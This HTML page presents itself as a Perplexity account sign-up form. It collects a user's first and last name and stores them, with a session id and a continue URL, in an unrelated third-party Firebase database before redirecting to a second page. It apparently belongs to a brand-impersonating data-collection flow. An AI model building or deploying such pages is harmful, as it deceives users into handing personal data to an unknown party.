<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <title>Create An Account</title>

    <style>
        /* CSS Variables mapping matching 2.html */
        :root {
            --bg-color: #ffffff;
            --text-primary: #000000;
            --text-secondary: #555555;
            --input-border: #c4c4c4;
            --input-focus: #000000;
            --input-bg: #ffffff;
            --btn-bg: #000000;
            --btn-text: #ffffff;
            --btn-hover: #333333;
            --error-text: #d93025;
        }

        /* Tied to manual/auto theme detection */
        body.dark {
            --bg-color: #000000;
            --text-primary: #ffffff;
            --text-secondary: #aaaaaa;
            --input-border: #555555;
            --input-focus: #ffffff;
            --input-bg: #000000; /* Changed from #1e1e1e to black */
            --btn-bg: #ffffff;
            --btn-text: #000000;
            --btn-hover: #e0e0e0;
            --error-text: #ff6b6b;
        }

        * {
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background-color: var(--bg-color); 
            color: var(--text-primary);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            transition: background-color 0.3s ease, color 0.3s ease;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 25px;
            text-align: center;
        }

        h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 15px;
            color: var(--text-primary);
            line-height: 1.3;
            max-width: 320px;
            margin-left: auto;
            margin-right: auto;
        }

        .subtitle {
            color: var(--text-secondary);
            font-size: 15px;
            margin-bottom: 35px;
            line-height: 1.4;
        }

        .input-group {
            position: relative;
            margin-bottom: 22px;
            text-align: left;
        }

        .input-group label {
            position: absolute;
            top: -10px;
            left: 20px; /* Matches capsule curve */
            background: var(--bg-color);
            padding: 0 5px;
            font-size: 12px;
            color: var(--text-secondary);
            z-index: 1;
            transition: background-color 0.3s ease, color 0.3s ease;
        }

        .input-field {
            width: 100%;
            padding: 14px 20px;
            border: 1px solid var(--input-border);
            border-radius: 50px; /* Capsule Look */
            font-size: 16px;
            outline: none;
            background-color: var(--input-bg);
            color: var(--text-primary);
            transition: border 0.2s;
        }

        .input-field:focus {
            border-color: var(--input-focus);
            border-width: 1.5px;
        }

        .btn-continue {
            width: 100%;
            padding: 15px;
            background-color: var(--btn-bg);
            color: var(--btn-text);
            border: none;
            border-radius: 50px; /* Capsule Look */
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
            transition: background-color 0.2s;
        }

        .btn-continue:hover {
            background-color: var(--btn-hover);
        }

        .error-text {
            color: var(--error-text);
            font-size: 13px;
            margin-top: 5px;
            display: none;
            text-align: left;
            padding-left: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Create a Perplexity Account</h1>

    <p class="subtitle" id="subtitleText">
        Enter your name
    </p>

    <div class="input-group">
        <label id="firstNameLabel">First name</label>
        <input
            type="text"
            id="firstName"
            class="input-field"
            placeholder="First name"
            required
            autofocus
        >
        <div id="fnError" class="error-text">
            First name is required
        </div>
    </div>

    <div class="input-group">
        <label>Last name</label>
        <input
            type="text"
            id="lastName"
            class="input-field"
            placeholder="Last name (optional)"
        >
    </div>

    <button class="btn-continue" id="continueBtn">
        Continue
    </button>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";

import {
    getFirestore,
    doc,
    setDoc
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

/* ================= FIREBASE ================= */

const firebaseConfig = {
    apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
    authDomain: "question-metabase.firebaseapp.com",
    databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "question-metabase",
    storageBucket: "question-metabase.firebasestorage.app",
    messagingSenderId: "770698198753",
    appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
    measurementId: "G-6ZP1FPMKSJ"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

/* ================= URL PARAMS ================= */

const params = new URLSearchParams(window.location.search);

let session = params.get("session");
let type = (params.get("type") || "personal").toLowerCase();
let continueUrl = params.get("continue") || "";
let theme = params.get("theme") ? params.get("theme").toLowerCase() : null;

/* ================= LIVE THEME ================= */

const mediaQuery = window.matchMedia("(prefers-color-scheme: dark)");

function applyTheme() {
    // Manual Theme Override
    if (theme === "dark" || theme === "d") {
        document.body.classList.add("dark");
        return;
    }

    if (theme === "light" || theme === "l") {
        document.body.classList.remove("dark");
        return;
    }

    // Auto Theme
    if (mediaQuery.matches) {
        document.body.classList.add("dark");
    } else {
        document.body.classList.remove("dark");
    }
}

applyTheme();

/* ===== REAL TIME THEME CHANGE ===== */

mediaQuery.addEventListener("change", () => {
    // only auto mode reacts live
    if (!theme) {
        applyTheme();
    }
});

/* ================= TYPE UI ================= */

function applyTypeUI() {
    const subtitle = document.getElementById("subtitleText");
    const firstNameInput = document.getElementById("firstName");

    if (type === "kids") {
        subtitle.textContent = "Enter your child's name";
        firstNameInput.placeholder = "First name";
    } else {
        subtitle.textContent = "Enter your name";
        firstNameInput.placeholder = "First name";
    }
}

applyTypeUI();

/* ================= SESSION ================= */

function initSession() {
    if (!session) {
        session = Math.floor(
            1000000000 + Math.random() * 9000000000
        ).toString();

        const newParams = new URLSearchParams();

        newParams.set("session", session);

        if (type) {
            newParams.set("type", type);
        }

        if (continueUrl) {
            newParams.set("continue", continueUrl);
        }

        if (theme) {
            newParams.set("theme", theme);
        }

        const newUrl =
            `${window.location.pathname}?${newParams.toString()}`;

        window.history.replaceState({}, "", newUrl);
    }
}

initSession();

/* ================= SUBMIT ================= */

async function submitData() {
    const firstName =
        document.getElementById("firstName")
        .value
        .trim();

    const lastName =
        document.getElementById("lastName")
        .value
        .trim();

    const errorDiv =
        document.getElementById("fnError");

    if (!firstName) {
        errorDiv.style.display = "block";
        return;
    }

    errorDiv.style.display = "none";

    let familyValue = "no";

    if (type === "kids") {
        familyValue = "commit";
    }

    if (type === "business") {
        familyValue = "workspace";
    }

    try {
        await setDoc(
            doc(db, "ASPX Keys", session),
            {
                "First Name": firstName,
                "Last Name": lastName,
                "Type": type,
                family: familyValue,
                continue: continueUrl || null,
                timestamp: new Date()
            }
        );

        // Build redirect URL preserving all parameter values
        const redirectParams = new URLSearchParams();
        redirectParams.set("session", session);
        if (type) {
            redirectParams.set("type", type);
        }
        if (continueUrl) {
            redirectParams.set("continue", continueUrl);
        }
        if (theme) {
            redirectParams.set("theme", theme);
        }

        window.location.href = `2.html?${redirectParams.toString()}`;

    } catch (error) {
        console.error("Error:", error);
    }
}

/* ================= EVENTS ================= */

document
.getElementById("firstName")
.addEventListener("keypress", (e) => {
    if (e.key === "Enter") {
        e.preventDefault();
        document
        .getElementById("lastName")
        .focus();
    }
});

document
.getElementById("lastName")
.addEventListener("keypress", (e) => {
    if (e.key === "Enter") {
        e.preventDefault();
        submitData();
    }
});

document
.getElementById("continueBtn")
.addEventListener("click", submitData);

</script>

</body>
</html>
